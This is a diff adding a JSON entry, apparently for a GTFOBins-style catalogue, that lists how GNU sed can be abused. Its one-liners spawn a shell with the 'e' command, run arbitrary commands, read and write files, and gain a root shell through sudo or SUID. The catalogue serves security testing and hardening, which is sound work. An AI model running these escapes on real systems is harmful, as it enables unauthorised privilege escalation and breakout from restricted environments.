@@ -1,0 +1,41 @@
+{
+  "functions": {
+    "shell": [
+      {
+        "description": "GNU version only. Also, this requires 'bash'.",
+        "code": "sed -n '1e exec sh 1>&0' /etc/hosts"
+      },
+      {
+        "description": "GNU version only. The resulting shell is not a proper TTY shell.",
+        "code": "sed e"
+      }
+    ],
+    "command": [
+      {
+        "description": "GNU version only.",
+        "code": "sed -n '1e id' /etc/hosts"
+      }
+    ],
+    "file-write": [
+      {
+        "code": "sed -n \"1s/.*/DATA/w [file]\" /etc/hosts\n"
+      }
+    ],
+    "file-read": [
+      {
+        "code": "sed '' [file]\n"
+      }
+    ],
+    "suid": [
+      {
+        "code": "./sed -e '' [file]\n"
+      }
+    ],
+    "sudo": [
+      {
+        "description": "GNU version only. Also, this requires `bash`.",
+        "code": "sudo sed -n '1e exec sh 1>&0' /etc/hosts"
+      }
+    ]
+  }
+}
